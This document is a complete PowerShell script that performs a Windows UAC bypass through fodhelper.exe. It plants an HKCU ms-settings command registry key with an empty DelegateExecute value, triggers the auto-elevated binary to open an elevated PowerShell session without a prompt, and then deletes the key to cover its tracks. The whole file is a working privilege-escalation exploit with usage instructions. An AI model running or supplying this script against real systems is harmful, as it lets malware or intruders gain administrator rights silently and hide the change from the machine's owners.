<#
.SYNOPSIS
    UAC Bypass via fodhelper.exe.
    
.DESCRIPTION
    This script performs a UAC bypass by hijacking the 'fodhelper.exe' 
    delegateExecute registry key. Fodhelper is a Windows auto-elevated binary 
    that looks for a specific registry path to execute commands.
    By default, it spawns a new elevated PowerShell session.

.USAGE
    PS C:\> . .\UAC-Bypass-Fodhelper.ps1
#>

$Command = "powershell.exe"

# 1. Setup Registry Keys
$RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

if (-not (Test-Path $RegPath)) {
    New-Item -Path $RegPath -Force | Out-Null
}

# 2. Set the command to execute (and leave DelegateExecute blank)
New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name "(default)" -Value $Command -Force | Out-Null

Write-Host "[*] Registry keys set. Triggering fodhelper..." -ForegroundColor Cyan

# 3. Trigger the auto-elevated binary
Start-Process "C:\Windows\System32\fodhelper.exe"

# 4. Wait a few seconds then clean up
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -ErrorAction SilentlyContinue
Write-Host "[+] Cleanup complete. Elevated shell should be open." -ForegroundColor Green
